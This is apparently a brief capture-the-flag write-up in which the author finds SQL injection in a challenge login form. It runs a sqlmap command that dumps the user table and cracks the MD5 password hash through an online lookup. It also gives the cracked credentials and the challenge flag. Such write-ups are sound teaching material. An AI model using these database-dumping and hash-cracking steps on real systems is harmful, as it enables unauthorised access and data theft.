## The Sequel

Pretty simple one actually.  
It is a login form, and my first instinct is always to try sql injection.  
I tried single quotes(') as username and it gave an error saying SQL syntax is wrong.  
This means that the login form was vulnerable to SQL injection.  

We can use `sqlmap` to exploit it.

> $ sqlmap --dump --form -u "https://web.ctf.devclub.in/web/1/login.php"

This command will give you a table with

```
+----------+----------+-----------+----------------------------------+
| lastname | username | firstname | password                         |
+----------+----------+-----------+----------------------------------+
| Singh    | as1605   | Aditya    | 386b8fe06ad1d01e027de7270f48822d |
+----------+----------+-----------+----------------------------------+

```

The password was hashed and it looked awfully lot like md5, so I put in md5decrypt.net and it decrypted it to be `wildspirit`.  
I entered the details  and got the flag
> CTF{7ql_1s_n0t_3asy_8_all}